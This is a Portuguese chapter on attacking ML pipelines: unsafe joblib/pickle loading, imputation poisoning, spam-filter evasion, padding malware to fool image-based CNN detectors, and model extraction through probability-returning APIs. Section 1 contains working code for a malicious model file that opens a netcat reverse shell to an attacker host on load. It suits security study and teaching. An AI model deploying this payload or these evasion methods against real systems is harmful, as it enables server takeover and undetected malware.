# Anatomia da Superfície de Ataque: Desconstruindo Pipelines de ML

Na engenharia de segurança ofensiva focada em Inteligência Artificial, o erro mais comum é tratar o modelo como uma caixa preta inescrutável. A realidade é que o modelo é apenas um artefato de software inserido em um pipeline de dados complexo e frágil. Ao analisar manuais de implementação defensiva, como o guia de Applications of AI in InfoSec, identificamos padrões de desenvolvimento que priorizam a facilidade de implementação em detrimento da segurança robusta.

Este capítulo disseca tecnicamente quatro vetores de ataque críticos que emergem diretamente das práticas de desenvolvimento de IA ensinadas ao mercado: a insegurança da serialização de objetos, a manipulação estatística de pré-processadores, a fragilidade de representações visuais em binários e o vazamento de informações através de oráculos de inferência.

## 1. O Vetor de Serialização e a Execução Remota de Código

A persistência de modelos de Machine Learning é frequentemente tratada como uma simples operação de I/O de arquivos. O documento de referência instrui explicitamente o uso da biblioteca joblib para salvar modelos treinados em arquivos, citando a eficiência na serialização de grandes arrays NumPy e evitando o custo computacional de retreinar modelos do zero.

Embora funcional, essa prática introduz uma vulnerabilidade crítica de Execução Remota de Código ou RCE. Bibliotecas de serialização Python como pickle, que é a base sobre a qual o joblib opera, não foram projetadas para serem seguras contra dados maliciosos. Elas são máquinas de pilha que reconstroem objetos Python arbitrários.

### A Mecânica Interna do Pickle e Joblib

Quando o desenvolvedor executa joblib.dump(model, filename), a biblioteca converte a hierarquia de objetos do modelo em um fluxo de bytes. Esse fluxo contém opcodes que instruem a Máquina Virtual do Pickle sobre como reconstruir o objeto.

O perigo reside no processo de desserialização ou carregamento. A máquina virtual do Pickle executa os opcodes sequencialmente. O protocolo permite a definição de como um objeto deve ser reduzido e reconstruído através do método mágico `__reduce__`. Um atacante pode criar um objeto malicioso que, ao ser inspecionado pelo joblib.load, declara que sua reconstrução requer a execução de uma função arbitrária do sistema operacional.

O código defensivo, ao carregar o arquivo spam_detection_model.joblib, acredita estar instanciando uma classe inofensiva como MultinomialNB. No entanto, ele está executando cegamente as instruções contidas no arquivo.

### Desenvolvimento do Exploit de Serialização

Para explorar essa falha, não é necessário ter acesso ao código-fonte do modelo original, apenas acesso de escrita ao local onde o arquivo .joblib é armazenado. O payload abaixo demonstra a construção de um artefato malicioso que injeta um shell reverso no servidor de inferência no momento exato em que o modelo é carregado para a memória.

```python
import joblib
import os
import subprocess

class MaliciousModelArtifact(object):
    """
    Classe artefato projetada para explorar a desserialização insegura.
    O método __reduce__ instrui o PVM (Pickle Virtual Machine) a executar
    um callable arbitrário durante o processo de load.
    """
    def __reduce__(self):
        # O payload é um comando de sistema que abre uma conexão reversa.
        # Em um cenário real, isso seria um shell reverso ou um beacon C2.
        cmd = ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f")
        
        # Eu faço retornar uma tupla contendo o callable (subprocess.Popen) e seus argumentos.
        # Isso será executado IMEDIATAMENTE quando joblib.load() for chamado.
        return (subprocess.Popen, (cmd, dict(shell=True)))

# Compilação do payload
exploit_payload = MaliciousModelArtifact()

# O arquivo gerado substitui o modelo legítimo no sistema alvo
joblib.dump(exploit_payload, 'spam_detection_model.joblib')
```

A mitigação técnica exigiria o abandono de formatos baseados em Pickle em favor de formatos de intercâmbio seguros e focados apenas em dados, como ONNX (Open Neural Network Exchange), que não permitem a execução de código arbitrário durante o carregamento da estrutura do grafo computacional. O uso continuado de joblib em ambientes de produção sem verificação de integridade criptográfica é uma falha de arquitetura grave.

## 2. Envenenamento Estatístico e Manipulação de Fronteiras de Decisão

A integridade de um modelo de Machine Learning depende inteiramente da distribuição estatística dos dados que o alimentam. O pipeline de defesa para detecção de anomalias de rede no dataset NSL-KDD utiliza a classe SimpleImputer do scikit-learn para lidar com dados faltantes. A estratégia adotada é substituir valores nulos pela mediana ou média dos dados existentes.

Essa técnica de limpeza de dados, embora estatisticamente válida para análise de dados estáticos, cria um vetor de ataque conhecido como Statistical Poisoning ou Envenenamento Estatístico em sistemas adversariais.

### A Matemática da Imputação como Vetor de Ataque

O SimpleImputer com estratégia de mediana calcula o valor central de uma distribuição de features. Se um atacante tiver a capacidade de injetar dados no conjunto de treinamento ou influenciar o fluxo de dados em tempo real antes do processamento em lote, ele pode manipular a mediana calculada.

Considere uma feature crítica para detecção de ataques de Negação de Serviço (DoS), como srv_count (número de conexões ao mesmo serviço). Um ataque real teria um valor muito alto nessa métrica. O modelo aprende a classificar valores altos como anomalias.

Se o atacante puder injetar tráfego malicioso fragmentado onde o campo srv_count é lido como nulo ou inválido, o pré-processador automático intervirá. Ele substituirá esses valores nulos pela mediana do tráfego "normal" observado.

O resultado é que o tráfego de ataque passa a ter, matematicamente, a assinatura estatística do tráfego benigno dentro do vetor de características que é entregue ao classificador RandomForest. O algoritmo de árvore de decisão não verá o ataque; ele verá apenas a mediana inofensiva inserida pelo próprio sistema de defesa.

### Exploração de Limiares em Random Forests

O classificador Random Forest opera criando múltiplas árvores de decisão e agregando seus votos. Cada nó de cada árvore toma uma decisão baseada em um limiar numérico específico de uma feature.

Ao envenenar a fase de imputação, o atacante efetivamente move a distribuição dos dados de entrada para longe desses limiares de corte. O ataque de "sapo fervido" (boiling frog) envolve enviar tráfego malicioso que está apenas ligeiramente acima do normal, aumentando gradualmente a variância aceita pelo modelo se este for retreinado periodicamente com os novos dados imputados. Isso degrada a fronteira de decisão do modelo, tornando-o progressivamente cego a anomalias reais.

## 3. Adversarial NLP: Evasão Probabilística em Filtros de Texto

No domínio do Processamento de Linguagem Natural (NLP), o pipeline defensivo para detecção de Spam utiliza o algoritmo Naive Bayes Multinomial sobre uma representação vetorial de palavras (Bag-of-Words) gerada pelo CountVectorizer.

A vulnerabilidade aqui não é de código, mas matemática. O classificador Naive Bayes assume que a presença de cada palavra em um documento é estatisticamente independente das outras. Essa suposição de "ingenuidade" é a chave para a evasão.

### A Lógica Bayesiana Contra Ela Mesma

A classificação é baseada na probabilidade posterior $P(Spam | Palavras)$. O modelo calcula isso multiplicando a probabilidade de cada palavra individual aparecer em mensagens de spam versus mensagens legítimas (ham).

$$P(Spam | W_1, W_2...) \propto P(Spam) \prod P(W_i | Spam)$$

Se uma mensagem contém palavras fortemente associadas a Spam (como "grátis", "ganhou", "clique"), a probabilidade resultante dispara. No entanto, o atacante pode explorar o denominador da equação ou a classe oposta.

A técnica de Good Word Insertion ou Inserção de Palavras Benignas consiste em anexar ao final da mensagem de spam uma longa lista de palavras que o modelo associou fortemente à classe "Ham" (legítimo). Palavras como "reunião", "projeto", "conversa", "anexo" ou termos específicos do contexto corporativo da vítima.

Como o modelo trata o texto como um "saco de palavras" sem ordem definida (exceto por bigramas limitados ), a "sopa" de palavras benignas dilui matematicamente a pontuação das palavras maliciosas. O produto das probabilidades das palavras benignas puxa a classificação final para a classe segura, permitindo que o payload de phishing chegue à caixa de entrada do usuário.

### Manipulação de Vocabulário e Stop Words

O pipeline defensivo configura o CountVectorizer com max_df=0.9. Isso instrui o modelo a ignorar palavras que aparecem em mais de 90% dos documentos, considerando-as irrelevantes (stop words de corpus específico).

Um atacante sofisticado pode realizar um ataque de Vocabulary Poisoning. Se ele conseguir enviar um grande volume de e-mails contendo uma palavra específica que deseja "cegar" no futuro, ele pode elevar a frequência documental dessa palavra acima de 90%. Quando o modelo for retreinado, essa palavra cairá na regra de max_df e será removida do vocabulário de features. Se essa palavra fosse um indicador chave de um novo tipo de ataque, o sistema de segurança foi efetivamente cegado para essa assinatura específica.

## 4. Evasão de Redes Neurais via Deslocamento de Representação

A abordagem de converter binários de malware em imagens em escala de cinza para classificação com Redes Neurais Convolucionais (CNNs) como a ResNet50 é uma técnica acadêmica popular ensinada no material de referência. O método mapeia cada byte do binário para um pixel (0-255).

Essa abstração cria uma superfície de ataque única baseada na sensibilidade espacial das CNNs. Redes como a ResNet50 são projetadas para detectar características visuais locais: bordas, texturas e formas. Elas possuem "invariância à translação" limitada, mas são altamente sensíveis à estrutura global da textura.

### Quebrando a Textura do Malware

Um binário executável possui seções definidas (cabeçalho PE, seções .text, .data, .rsrc). Quando visualizado como imagem, o código nativo compactado ou ofuscado aparece como uma textura de alta entropia (ruído estático), enquanto seções de dados ou preenchimento aparecem como blocos sólidos ou padrões repetitivos.

O classificador aprende a identificar a "textura" específica de famílias de malware (ex: a entropia visual do WannaCry).

O ataque consiste em manipular o binário de forma a não alterar sua execução, mas destruir sua representação visual. Isso é trivialmente alcançado através de técnicas de Padding e Section Injection.

**Padding de Fim de Arquivo:** Adicionar bytes aleatórios ou nulos ao final do executável. Isso altera as dimensões da imagem gerada ou "empurra" a textura maliciosa para coordenadas que a CNN não pondera fortemente.

**Injeção de Ruído:** Inserir instruções NOP (No Operation) ou dados lixo em áreas inalcançáveis do código. Isso introduz "linhas" ou "blocos" na imagem gerada que quebram a continuidade da textura que a ResNet50 aprendeu a reconhecer.

Como o modelo usa Transfer Learning e congela as camadas iniciais de extração de features, ele não consegue se adaptar a essas novas texturas artificiais. O malware continua funcional, mas para o "olho" da IA, ele agora se parece com ruído desconhecido ou com um software benigno, resultando em uma classificação de Falso Negativo.

## 5. Extração de Modelos via Oráculos de Inferência

A etapa final do pipeline expõe o modelo através de uma API REST, onde o usuário envia dados e recebe a predição. O exemplo fornecido retorna não apenas a classe (Spam/Não-Spam), mas também a probabilidade exata de cada classe com alta precisão decimal.

```json
"Spam Probability": 0.94,
"Not-Spam Probability": 0.06
```

Essa verbosidade transforma a API em um "Oráculo". Em criptografia, um oráculo que revela informações parciais sobre o estado interno pode ser usado para quebrar o sistema. Em IA, isso permite ataques de Model Extraction ou Roubo de Modelo.

### Clonagem de Modelos via Gradiente de Caixa Preta

Um atacante não precisa roubar o arquivo .joblib para ter o modelo. Ele pode recriá-lo matematicamente. Ao enviar consultas iterativas para a API e observar como a probabilidade de confiança muda (o gradiente da saída) em resposta a pequenas alterações na entrada, o atacante mapeia a fronteira de decisão do modelo.

Utilizando técnicas como Jacobian-based Augmentation, o atacante treina um "Modelo Sombra" (Shadow Model) localmente. A API da vítima serve como o "professor" que rotula os dados para o modelo do atacante. Com um número surpreendentemente pequeno de consultas, é possível obter um modelo local que é funcionalmente equivalente ao modelo proprietário da vítima.

Uma vez que o atacante possui o clone do modelo, ele pode realizar ataques de White-box (caixa branca) offline. Ele pode calcular os exemplos adversariais perfeitos no conforto de sua infraestrutura, sem disparar alertas de taxa de requisição na API da vítima, e então lançar o ataque final com a certeza matemática de que passará pelo filtro.

Além disso, a confiança extrema (valores muito próximos de 1.0 ou 0.0) vaza informações sobre os dados de treinamento. Ataques de Membership Inference utilizam essas pontuações para determinar estatisticamente se um dado registro específico (como o e-mail privado de um executivo) foi utilizado durante o treinamento do modelo, transformando uma ferramenta de segurança em um vetor de vazamento de privacidade.